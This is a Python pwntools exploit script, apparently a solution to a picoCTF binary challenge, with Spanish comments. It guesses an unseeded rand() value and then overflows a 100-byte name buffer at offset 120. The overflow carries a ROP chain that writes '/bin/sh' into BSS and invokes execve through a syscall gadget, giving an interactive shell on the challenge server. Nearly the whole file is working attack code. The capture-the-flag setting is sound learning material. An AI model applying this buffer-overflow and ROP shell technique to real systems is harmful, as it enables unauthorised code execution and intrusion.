#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = '''
b main
b *0x00000000004163f4
b *0x000000000047ff91
b *0x0000000000400c6c
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("jupiter.challenges.picoctf.org", 42953)
    return r


def main():

    r = conn()
    randoms = ["84"]  # Como el programa usa rand sin establecer una semilla, los valores aleatorios siempre son los mismos

    num = randoms[0].encode()
    r.sendlineafter(b'What number would you like to guess?', num)

    offset = 120
    pop_rax = 0x00000000004163f4  # pop rax ; ret
    pop_rbx = 0x0000000000400ed8  # pop rbx ; ret
    mov_qword_rsi_rax = 0x000000000047ff91  # mov qword ptr [rsi], rax ; ret
    mov_qword_rax_rdx = 0x000000000048dd71  # mov qword ptr [rax], rdx ; ret
    pop_rdi = 0x0000000000400696  # pop rdi ; ret
    pop_rsi = 0x0000000000410ca3  # pop rsi ; ret
    push_rsi = 0x00000000004a7366  # push rsi ; ret
    binsh = b"/bin/sh\x00"
    pop_rbp = 0x0000000000400aa8  # pop rbp ; ret
    syscall = 0x000000000040137c

    bss = exe.bss()

    payload = flat({offset: [
        pop_rax, binsh,  # Cargar en RAX la cadena "/bin/sh"
        pop_rsi, bss,  # Cargar en RSI la dirección de una sección libre en el BSS
        mov_qword_rsi_rax,  # Mover la cadena "/bin/sh" a esa dirección en BSS
        pop_rdi, bss,  # Cargar la dirección de "/bin/sh" en RDI para pasarla como argumento a execve
        pop_rax, 0x3b,  # Cargar 59 en RAX para indicar syscall execve
        pop_rsi, 0x00,  # Establecer RSI en NULL
        syscall
    ]})

    # En el código se leen 360 bytes, pero el buffer 'winner' tiene solo 100, lo que permite un desbordamiento de búfer
    r.sendlineafter(b'Name?', payload)

    r.interactive()


if __name__ == "__main__":
    main()

